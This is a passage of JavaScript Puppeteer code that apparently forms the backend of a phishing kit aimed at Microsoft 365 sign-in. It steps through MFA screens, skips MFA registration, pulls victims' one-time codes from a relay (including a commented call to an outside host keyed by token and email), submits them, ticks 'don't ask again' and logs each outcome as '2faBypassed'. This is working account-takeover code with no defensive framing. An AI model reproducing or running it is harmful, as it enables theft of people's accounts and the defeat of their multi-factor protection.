    }
        }else{console.log('mfa box err');}
    }else{
     isMfaBox = true;
    }
}else if (await page.$('#idDiv_SAOTCAS_Title') !== null) {
    console.log('#idDiv_SAOTCAS_Title..');
    isMfa = true;
    //MfaMode=2;//or1
    if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
    console.log('mfa PhoneAppNotification box');
    //MfaMode=0;
    if(MfaNeedMode&&MfaMode&&MfaMode !== MfaNeedMode){
        if (await page.$('#idDiv_SAOTCS_HavingTrouble') !== null ){
        isMfaPanel = await page.waitForSelector("#idDiv_SAOTCS_HavingTrouble").then(async() => {page.click("#idDiv_SAOTCS_HavingTrouble");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok()); console.log("#idDiv_SAOTCS_HavingTrouble"); return true; }).catch(e => { console.log("mfa catch err6:"+e); return false; });    
        console.log('isMfaPanel='+isMfaPanel);
        }else if(await page.$('#signInAnotherWay') !== null) {
        isMfaPanel = await page.waitForSelector("#signInAnotherWay").then(async() => {page.click("#signInAnotherWay");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok()); console.log("#signInAnotherWay"); return true; }).catch(e => { console.log("mfa catch err7:"+e); return false; });    
        console.log('isMfaPanel='+isMfaPanel);
        }
        if(await page.$('#idDiv_SAOTCS_Proofs_Section') !== null){
            
               if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods6'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully6');
   }
                all2FA = await page.evaluate(() => { let anchors = Array.from(document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div")); let anchors2 =anchors.map(anchor => anchor.getAttribute("data-value")); return anchors2; });
                console.log('all2FA(3):'+JSON.stringify(all2FA, null, 4));
        isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {page.click(MfaNeedSelector[0]);await page.waitForNavigation('networkidle0');await page.waitForSelector(MfaNeedSelector[1]); console.log(MfaNeedSelector[0]+'++'); return true; }).catch(e => { console.log(MfaNeedSelector[0]+" catch err:1"+e); return false; });
        console.log('isMfaBox = '+isMfaBox);
    if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
        }else{console.log('mfa box err');}
    }
}else if (await page.$('#idDiv_SAASTO_Title') !== null) {
    console.log('#idDiv_SAASTO_Title..');
    isMfa = true;
    //MfaMode=2;//or1
    if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
    console.log('mfa timeout');
    if(MfaNeedMode&&MfaMode&&MfaMode !== MfaNeedMode){
        if (await page.$('#idDiv_SAOTCS_HavingTrouble') !== null) {
        isMfaPanel = await page.waitForSelector("#idDiv_SAOTCS_HavingTrouble").then(async() => {page.click("#idDiv_SAOTCS_HavingTrouble");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok()); console.log("#idDiv_SAOTCS_HavingTrouble"); return true; }).catch(e => { console.log("mfa catch err8:"+e); return false; });    
        console.log('isMfaPanel='+isMfaPanel);
        }else if(await page.$('#signInAnotherWay') !== null) {
        isMfaPanel = await page.waitForSelector("#signInAnotherWay").then(async() => {page.click("#signInAnotherWay");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok()); console.log("#signInAnotherWay"); return true; }).catch(e => { console.log("mfa catch err9:"+e); return false; });    
        console.log('isMfaPanel='+isMfaPanel);
        }
        if(await page.$('#idDiv_SAOTCS_Proofs_Section') !== null){
            
               if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods7'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully7');
   }
             all2FA = await page.evaluate(() => { let anchors = Array.from(document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div")); let anchors2 =anchors.map(anchor => anchor.getAttribute("data-value")); return anchors2; });
             console.log('all2FA(4):'+JSON.stringify(all2FA, null, 4));   
        isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {page.click(MfaNeedSelector[0]);await page.waitForNavigation('networkidle0');await page.waitForSelector(MfaNeedSelector[1]); console.log(MfaNeedSelector[0]); return true; }).catch(e => { console.log(MfaNeedSelector[0]+" catch err:2"+e); return false; });
        console.log('isMfaBox = '+isMfaBox);
    if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
        }else{console.log('mfa box err');}
    }else{
        if (await page.$('#idA_SAASTO_SendCode') !== null) {
        console.log('send code again');  //?? 
        isMfaBox = await page.waitForSelector('#idA_SAASTO_SendCode').then(async() => {page.click('#idA_SAASTO_SendCode');await page.waitForNavigation('networkidle0');await page.waitForSelector(MfaNeedSelector[1]); console.log(MfaNeedSelector[0]); return true; }).catch(e => { console.log(MfaNeedSelector[0]+" catch err:2"+e); return false; });
        console.log('isMfaBox = '+isMfaBox);
    if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
        }else if (await page.$('#signInAnotherWay') !== null) {
        isMfaPanel = await page.waitForSelector("#signInAnotherWay").then(async() => {page.click("#signInAnotherWay");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok()); console.log("#signInAnotherWay"); return true; }).catch(e => { console.log("mfa catch err10:"+e); return false; });    
        console.log('isMfaPanel='+isMfaPanel);  
        }
        if(await page.$('#idDiv_SAOTCS_Proofs_Section') !== null){
            
               if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods8'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully8');
   }
             all2FA = await page.evaluate(() => { let anchors = Array.from(document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div")); let anchors2 =anchors.map(anchor => anchor.getAttribute("data-value")); return anchors2; });
             console.log('all2FA(7):'+JSON.stringify(all2FA, null, 4));   
        isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {page.click(MfaNeedSelector[0]);await page.waitForNavigation('networkidle0');await page.waitForSelector(MfaNeedSelector[1]); console.log(MfaNeedSelector[0]); return true; }).catch(e => { console.log(MfaNeedSelector[0]+" catch err:2"+e); return false; });
    if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
        console.log('isMfaBox = '+isMfaBox);
        }else{console.log('mfa box err');}
    }
    
}else if (await page.$('#debugDetailsHeader') !== null) {
    console.log('error');
    successlogin = false;
    faillogin = true;
    
}else if (await page.$('#ProofUpDescription') !== null) {
    console.log('Help us protect your account');
    successlogin = true;
console.log(await page.url()); //here   
if (await page.$('a[data-bind*=STR_SkipMfaRegistration]') !== null/*||await page.$('#idSubmit_ProofUp_Redirect') !== null*/) {
        isSkipMfaR = await page.waitForSelector("a[data-bind*=STR_SkipMfaRegistration]").then(async() => {await page.click("a[data-bind*=STR_SkipMfaRegistration]");/*await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok());*/await page.waitForFunction(`(window.location.href.includes("https://www.office.com/")||window.location.href.includes("${Redirect_uri}")||window.location.href.includes("resume?ctx=")||window.location.href.includes("skipmfaregistration=1"))&&(document.querySelector("#KmsiDescription")||document.querySelector("#hero-heading")||window.location.href.includes("${Redirect_uri}"))`); console.log("SkipMfaRegistration"); return true; }).catch(async(e) => { console.log("mfa 1st catch err:"+e);try{page.click("a[data-bind*=STR_SkipMfaRegistration]");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok());page.waitForFunction(`(window.location.href.includes("https://www.office.com/")||window.location.href.includes("${Redirect_uri}")||window.location.href.includes("resume?ctx=")||window.location.href.includes("skipmfaregistration=1"))&&(document.querySelector("#KmsiDescription")||document.querySelector("#hero-heading")||window.location.href.includes("${Redirect_uri}"))`); console.log("2nd SkipMfaRegistration"); return true;}catch(ee){ console.log("mfa 2nd catch err:"+ee);return false; }});    
        console.log('isSkipMfaR='+isSkipMfaR);
//const url = await page.evaluate(() => location.href);
const Url = await page.url();
console.log('MfaR is skipped');
//await page.waitForTimeout(10000);
//console.log('after 10000'); 
console.log('After_SkipMfaR_URL:'+Url);
if (isSkipMfaR && (Url.includes(Redirect_uri)||Url.includes('https://www.office.com/')||Url.includes('https://www.office.com/')||await page.$('#hero-heading') !== null)) {
console.log('office.com');
done = true;
}else if(isSkipMfaR && await page.$('#KmsiDescription') !== null) {
console.log('Stay signed in');
done = await page.waitForSelector("#idSIButton9").then(async() => {await page.click("#idSIButton9");/*await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok());*/ console.log("(Stay signed in) button submited1");/*const url = await page.evaluate(() => location.href);*/await page.waitForFunction(`(window.location.href.includes("https://www.office.com/")||window.location.href.includes("${Redirect_uri}"))&&!window.location.href.includes("resume?ctx=")&&!window.location.href.includes("skipmfaregistration=1")`);const currentURL = await page.url();console.log("(Stay signed in) button submited2");console.log("(Stay signed in) button submited3:"+currentURL);if (currentURL.includes('https://www.office.com/')||currentURL.includes(Redirect_uri)||await page.$('#hero-heading') !== null) {console.log('https://www.office.com/');}; return true; }).catch(e => { console.log("Stay signed in catch err1:"+e); return false; });
console.log('done='+done);
}    
    
}else if(await page.$('#idSubmit_ProofUp_Redirect') !== null){
console.log('MfaR can not skipped');    
done = true;
    successlogin = true;
    faillogin = false;
    status= 'SuccessLoginRequiresMfar'; 
}
}else{
    console.log('unrecognized error');
    successlogin = false;
    faillogin = true;
}

}else if(await page.$('#passwordError') !== null){
    console.log('password Error');
    IsO365 = true;
    successlogin = false;
    faillogin = true;
    status= 'passwordError'; 
}else if(await page.$('#usernameError')){
    console.log('username Error');
    successlogin = false;
    wronguser = true;
    faillogin = true;
    status= 'usernameError'; 
}else if (await page.$('input[name=passwd]') !== null) {
    console.log('fail login');
    IsO365 = true;
    successlogin = false;
    faillogin = true;
}else if (await page.$('#debugDetailsHeader') !== null) {
    console.log('error login');
    successlogin = false;
    faillogin = true;
}
   // var successlogin = await page.waitForSelector("#hero-heading").then(async() => { console.log("SUCCESS"); page.waitForSelector("#edgeworth-Shared-tab"); /*page.click("#edgeworth-Favorites-tab")*/;await Promise.all([page.waitForNavigation({ waitUntil: 'networkidle2' }),page.click("#edgeworth-Favorites-tab")]); return true; }).catch(e => { console.log("FAIL1 err:"+e); return false; });


//   #KmsiDescription
//   #idSIButton9
//   #idBtn_Back
    
    //await Promise.all([page.click("input[type=submit][id=idSIButton9]"),page.waitForNavigation({ waitUntil: 'networkidle2' })]);
    //console.timeEnd('selectorpass('+RandArr[3]+')');
    
    
 //document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div > div > div.table-cell.content > div").textContent
 
 
 //#idDiv_SAASTO_SendErrorTitle && 
 
 //#idSpan_SAOTCS_Error_OTC panel error
 
//#signInAnotherWay 

//#idDiv_SAASTO_Trouble
console.log("Mfa Modes 1:PhoneAppNotification 2:PhoneAppOTP 3:OneWaySMS 4:TwoWayVoiceMobile 5:verify_email");
//heading = await page.waitForSelector("#hero-heading").then(async() => { console.log("SUCCESS"); page.waitForSelector("#edgeworth-Shared-tab"); /*page.click("#edgeworth-Favorites-tab")*/;await Promise.all([page.waitForNavigation({ waitUntil: 'networkidle2' }),page.click("#edgeworth-Favorites-tab")]); return true; }).catch(e => { console.log("FAIL1 err:"+e); return false; });
if(successlogin){console.log('successlogin'); faillogin=false;};
console.log('done:'+done);
console.log('faillogin:'+faillogin);
console.time('fetchall('+RandArr[5]+')');
if(successlogin&&!done&&!faillogin&&(isMfaPanel||isMfaBox||isMfa)){
 await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'BeforeFetch2Get2fa',datadebug,false);

//const http from 'node:http';
//import https from 'node:https';
//const http = require('http');
/*const httpAgent = new http.Agent({
	keepAlive: true
});
*/
/*
const httpsAgent = new https.Agent({
	keepAlive: true
});
*/
/*const options = {
	agent: function(_parsedURL) {
		if (_parsedURL.protocol == 'http:') {
			return httpAgent;
		} else {
			return httpAgent;//httpsAgent
		}
	}
};
*/
//console.log('BeginAuth:',await BeginAuth);
console.log('BeginAuthjson:',await BeginAuthjson);
console.log('BeginAuthjson[Timestamp]:.',await BeginAuthjson['Timestamp']);
const BeginAuthjsonTime = await BeginAuthjson['Timestamp'];
const BeginTime = new Date(BeginAuthjsonTime);
console.log('BeginTime:',BeginTime);
const EndTime = new Date();
console.log('EndTime:',EndTime);
console.log('BeginTime.getTime():',BeginTime.getTime());
console.log('EndTime.getTime():',EndTime.getTime());
if(MfaMode=='PhoneAppOTP'){
    var limiteTime = 180000;
}else if(MfaMode=='OneWaySMS'){
    var limiteTime = 180000;
}else if(MfaMode=='PhoneAppNotification'){
    var limiteTime = 55000;
}
console.log('BeginTime.getTime()+'+limiteTime+'s:',BeginTime.getTime()+limiteTime);
console.log('BeginTime.getTime()+'+limiteTime+'s:',new Date(BeginTime.getTime()+limiteTime));





if(MfaMode=='PhoneAppOTP'||MfaMode=='OneWaySMS'){
/*    
if(i>1&&new Date().getTime()+(500*(i+110)) < BeginTime.getTime()+limiteTime){
console.log('waitForTimeout1(i:'+i+'): '+(500*i)+'ms');    
await page.waitForTimeout(500*i);
}else if(i>1&&new Date().getTime()+(500*(i-imoin)) < BeginTime.getTime()+limiteTime){
imoin++;
imoin++;
imoin++;
if(i>imoin){
console.log('waitForTimeout2(i:'+i+'): '+500*(i-imoin)+'ms');    
await page.waitForTimeout(500*(i-imoin));
}else{
console.log('waitForTimeout3(i:'+i+'): '+500+'ms');    
 await page.waitForTimeout(500);   
}
}else if(i>1){
console.log('waitForTimeout4(i:'+i+'): '+500+'ms');        
await page.waitForTimeout(500);
}
*/



/*
console.log("fetching1...");
const urlf1 = `https://exrobotos.com/api-s-v6.php?get2fa&130413041987&token=${token}&id=${dataid}&mm=${encodeURIComponent(btoa_safe(dataemail))}`;
console.log('urlf1: '+urlf1);
*/
try{
//var res1 = await page.evaluate((i,urlf1) => { return fetch(`${urlf1}`, {cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) { return json; }); },i,urlf1);
//100%//var res1 = await fetch(`${urlf1}`, {cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) { return json; });


MfaCode = await waitForOTP(dataid,decodeURI(dataemail),'login',{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode],BeginTime.getTime(),limiteTime,1000,page,'#idSpan_SAOTCC_Error_OTC');
console.log('MfaCode :.'+MfaCode);

if(typeof MfaCode !== 'undefined' && MfaCode/*res1&&res1.Code!==false*/){ isget2fakey = MfaCode /*isget2fakey = res1.Code*/;console.log('2fa: '+isget2fakey); try{await page.$eval('#idTxtBx_SAOTCC_OTC', el => el.value = '');await page.type("#idTxtBx_SAOTCC_OTC",isget2fakey/*res1.Code*/,{delay:25});console.log("2fa puted");}catch(e){console.log("2fa not puted catch err:"+e);}await page.waitForSelector("#idSubmit_SAOTCC_Continue");await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'AfterType2fa',datadebug,false);/*;await page.click("#idSubmit_SAOTCC_Continue");await page.waitForNavigation()*//*await page.waitForNavigation('networkidle0');*/try{if(await page.$('#idChkBx_SAOTCC_TD') !== null){await page.$eval('#idChkBx_SAOTCC_TD', check => check.checked = true);console.log("Checkbox checked: Don't ask again for ? days.");}}catch(e){console.log('Checkbox catch error:'+e);};try{page.click("#idSubmit_SAOTCC_Continue");ResponseEnd = await page.waitForResponse((response) => {return response.url() == 'https://login.microsoftonline.com/common/SAS/EndAuth'})/*"https://login.microsoftonline.com/common/SAS/ProcessAuth"*/;console.log("2fa submited:");console.log('ResponseEndURL():',ResponseEnd.url());try{console.log('Response:',JSON.stringify(await ResponseEnd.json()));/*console.log('Response2:',JSON.stringify(await ResponseAuth.json()));*/}catch(errr){console.log('EndAuth Response IS NOT JSON errr:'+errr);};}catch(e){isMfaError=true;console.log('someting happened with 2fa. catch error1:'+e);}if(ResponseEnd){try{ResponseEndjson=await ResponseEnd.json();console.log('Success:'+ResponseEndjson['Success']);}catch(err){console.log('faild fetch ResponseEnd.json()');ResponseEndjson=false;}if((ResponseEndjson && ResponseEndjson['Success'] && ResponseEndjson['Success']===true)||!ResponseEndjson&&(await page.url().includes('https://www.office.com/')||await page.url().includes(Redirect_uri)||await page.url().includes('/SAS/ProcessAuth')||await page.$('#hero-heading') !== null||await page.url().includes('login.microsoftonline.com/kmsi')||await page.$('#KmsiDescription') !== null)){MfaFailed=false;MfaSucceed=true;console.log('2fa succeed');status="2faBypassed";}else if(ResponseEndjson && ResponseEndjson['Success']===false&&(ResponseEndjson['ResultValue']==="OathCodeIncorrect"||ResponseEndjson['ResultValue']==="SMSAuthFailedWrongCodeEntered")/*ResponseEndjson['Message']==='Wrong code entered.'*/){MfaFailed=true;MfaSucceed=false;console.log('Wrong code 2fa');status="Wrongcode2fa";}else if(ResponseEndjson && ResponseEndjson['Success']===false && ResponseEndjson['ResultValue']==="InvalidSession"){MfaFailed=true;MfaSucceed=false;console.log('2fa Expired');status="2faExpired";}else if(ResponseEndjson && ResponseEndjson['Success']===false){MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}else{isMfaError=true;console.log('something happened with 2fa');MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}}else{isMfaError=true;console.log('something happend with 2fa.');MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}/*await page.waitForFunction("!document.querySelector('#idSubmit_SAOTCC_Continue') || document.querySelector('#iddSpan_SAOTCC_Error_OTC')")*/ if(isMfaError){if (await page.$('.alert-error') !== null) {console.log("Wrong 2fa"); status="2faFailed";}else if(await page.$('#idSpan_SAOTCC_Error_OTC') !== null){console.log("incorrect 2fa code");status="2faFailed";}else if(await page.$('#expired') !== null){console.log("error 2fa code or expired or someting happend with 2fa");status="2faExpired";}else{console.log("2fa bypassed");}} /*ok=true; */} else {console.log("2fa null");isget2fakey = null;status="2faIntrouvable";}
}catch(e){ isMfaError=true;console.log("2fa is failed catch err:"+e); }

//ResultValue=="OathCodeFailedMaxAllowedRetryReached"
//You've entered too many codes. Please close your browser and sign in again.
//"ResultValue": "InvalidSession",
//Your session has timed out. Please close your browser and sign in again.
//if(isMfaError){
console.log('isMfaError:'+isMfaError);    

  let textToFind4 = "You didn't enter the expected verification code. Please try again.";//sms
  let textToFind = "Your session has timed out. Please close your browser and sign in again.";//Microsoft Authenticator app 
  let textToFind2 = "You've entered too many codes. Please close your browser and sign in again.";
  let textToFind3 = "Sorry, we're having trouble verifying your account. Please try again with a different verification option.";//without input
    console.log('status:'+status);
  console.log('MfaCode:'+MfaCode);
 await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'textToFind',datadebug,false);


let elementtext = false;
try{
if(await page.$("#idSpan_SAOTCC_Error_OTC") !== null){
//*[@id="idSpan_SAOTCC_Error_OTC"][text()!='']
//await page.$x(`//span[text()="You didn't enter the expected verification code. Please try again."]`)!==[]
let [element] = await page.$x('//*[@id="idSpan_SAOTCC_Error_OTC"][text()!=""]');
elementtext = await page.evaluate(element => element.textContent, element);
//idSpan_SAOTCC_Error_OTC
////*[@id="idSpan_SAOTCC_Error_OTC"][text()!='']

console.log('textToFind:'+elementtext);



}
}catch(e){ console.log("textToFind catch err:"+e); }

//}

//await page.reload({ waitUntil: ["networkidle0", "domcontentloaded"] });

if(MfaCode&&(status=="Wrongcode2fa"||status=="2faFailed")&&(await page.$("#idTxtBx_SAOTCC_OTC") !== null && (!elementtext || (elementtext!==textToFind&&elementtext!==textToFind2)))){
console.log('put code again');
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode]][MfaCode]='no';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode]]['result']='WrongCode';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode]]['retry']=true;   

try{
   
//const [link2] = await page.$x(`span[text()="${textToFind}"]`);
//const [link2] = await page.$x(`//a[text()="${textToFind}"]`);
//var OktaCode1 = OktaCode;
MfaCode = false;
MfaCode = await waitForOTP(dataid,decodeURI(dataemail),'login',{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode],BeginTime.getTime(),limiteTime,1000,page);
console.log('MfaCode :..'+MfaCode);

if(typeof MfaCode !== 'undefined' && MfaCode/*res1&&res1.Code!==false*/){ isget2fakey = MfaCode /*isget2fakey = res1.Code*/;console.log('2fa: '+isget2fakey); try{/*await page.click("#idTxtBx_SAOTCC_OTC",{clickCount: 3})*/await page.$eval('#idTxtBx_SAOTCC_OTC', el => el.value = '');await page.type("#idTxtBx_SAOTCC_OTC",isget2fakey/*res1.Code*/,{delay:25});console.log("2fa puted.");}catch(e){console.log("2fa not puted catch err:"+e);}await page.waitForSelector("#idSubmit_SAOTCC_Continue");await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'AfterType2fa',datadebug,false);/*;await page.click("#idSubmit_SAOTCC_Continue");await page.waitForNavigation()*//*await page.waitForNavigation('networkidle0');*/try{if(await page.$('#idChkBx_SAOTCC_TD') !== null){await page.$eval('#idChkBx_SAOTCC_TD', check => check.checked = true);console.log("Checkbox checked: Don't ask again for ? days.");}}catch(e){console.log('Checkbox catch error:'+e);};try{page.click("#idSubmit_SAOTCC_Continue");console.log('click #idSubmit_SAOTCC_Continue');ResponseEnd = await page.waitForResponse((response) => {return response.url() == 'https://login.microsoftonline.com/common/SAS/EndAuth'});/*"https://login.microsoftonline.com/common/SAS/ProcessAuth"*/;console.log("2fa submited:");console.log('ResponseEndurl():',ResponseEnd.url());try{console.log('ResponseEnd :',JSON.stringify(await ResponseEnd.json()));/*console.log('Response2:',JSON.stringify(await ResponseAuth.json()));*/}catch(errr){console.log('EndAuth Response IS NOT JSON errr :'+errr);};}catch(e){isMfaError=true;console.log('someting happened with 2fa. catch error1:.'+e);}if(ResponseEnd){try{ResponseEndjson=await ResponseEnd.json();console.log('Success:'+ResponseEndjson['Success']);}catch(err){console.log('faild fetch ResponseEnd.json().');ResponseEndjson=false;}if((ResponseEndjson && ResponseEndjson['Success'] && ResponseEndjson['Success']===true)||!ResponseEndjson&&(await page.url().includes('https://www.office.com/')||await page.url().includes(Redirect_uri)||await page.url().includes('/SAS/ProcessAuth')||await page.$('#hero-heading') !== null||await page.url().includes('login.microsoftonline.com/kmsi')||await page.$('#KmsiDescription') !== null)){MfaFailed=false;MfaSucceed=true;console.log('2fa succeed');status="2faBypassed";}else if(ResponseEndjson && ResponseEndjson['Success']===false&&(ResponseEndjson['ResultValue']==="OathCodeIncorrect"||ResponseEndjson['ResultValue']==="SMSAuthFailedWrongCodeEntered")/*ResponseEndjson['Message']==='Wrong code entered.'*/){MfaFailed=true;MfaSucceed=false;console.log('Wrong code 2fa');status="Wrongcode2fa";}else if(ResponseEndjson && ResponseEndjson['Success']===false && ResponseEndjson['ResultValue']==="InvalidSession"){MfaFailed=true;MfaSucceed=false;console.log('2fa Expired');status="2faExpired";}else if(ResponseEndjson && ResponseEndjson['Success']===false){MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}else{isMfaError=true;console.log('something happened with 2fa');MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}}else{isMfaError=true;console.log('something happend with 2fa.');MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";};/*await page.waitForFunction("!document.querySelector('#idSubmit_SAOTCC_Continue') || document.querySelector('#iddSpan_SAOTCC_Error_OTC')")*/ if(isMfaError){if (await page.$('.alert-error') !== null) {console.log("Wrong 2fa"); status="2faFailed";}else if(await page.$('#idSpan_SAOTCC_Error_OTC') !== null){console.log("incorrect 2fa code");status="2faFailed";}else if(await page.$('#expired') !== null){console.log("error 2fa code or expired or someting happend with 2fa");status="2faExpired";}else{console.log("2fa bypassed");}} /*ok=true; */} else {console.log("2fa null");isget2fakey = null;status="2faIntrouvable";}
}catch(e){ console.log("2fa not failed catch err:"+e); }

}else if((!MfaCode||status=="2faIntrouvable" ||status=="2faExpired"|| (elementtext && elementtext!==textToFind&&elementtext!==textToFind2)) /*&& (await page.$("#idTxtBx_SAOTCC_OTC") !== null && await page.$("#signInAnotherWay") !== null)*/){
console.log('2fa Expired');
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode]]['result']=status;
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode]]['retry']=true; 
if(await page.$('#signInAnotherWay')||await page.$('#idBtn_Back')){
    if(await page.$('#signInAnotherWay')){
    await page.click("#signInAnotherWay");
    console.log('click "#signInAnotherWay" and chose sms mfa again');
    }else if(await page.$('#idBtn_Back')){
    await page.click("#idBtn_Back");
    console.log('click "#idBtn_Back" and chose sms again');
    }
    try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err24:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
    //await page.waitForFunction("document.querySelector('#idDiv_SAOTCS_Proofs_Section')",{ timeout: 15100});
await page.waitForSelector('#idDiv_SAOTCS_Proofs_Section');
    
 if(await page.$('#idDiv_SAOTCS_Proofs_Section') !== null){
         console.log('isMfaPanel...');
            if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods9'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully9');
   }
             all2FA = await page.evaluate(() => { let anchors = Array.from(document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div")); let anchors2 =anchors.map(anchor => anchor.getAttribute("data-value")); return anchors2; });
             console.log('all2FA(6):'+JSON.stringify(all2FA, null, 4));   
        //document.querySelector("[data-value="+MfaMode+"]").click();
        await page.click("[data-value="+MfaMode+"]");
        isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {page.click('[data-value='+MfaMode+']');await page.waitForSelector('#idTxtBx_SAOTCC_OTC'); console.log('[value='+MfaMode+']'); return true; }).catch(async(e) => {console.log(e)});
        console.log('isMfaBox = '+isMfaBox);
    if (await page.$('[value='+MfaMode+']') !== null && await page.$('#idTxtBx_SAOTCC_OTC') !== null ) {
    //MfaMode=MfaNeedMode; 
     isMfaBox = true;
     
     console.log('[value='+MfaMode+'] is clicked');


try{
   

//await page.reload({ waitUntil: ["networkidle0", "domcontentloaded"] });
if(await page.$("#idTxtBx_SAOTCC_OTC") !== null){
    console.log("2fa box after recheck sms from list");

MfaCode = false;
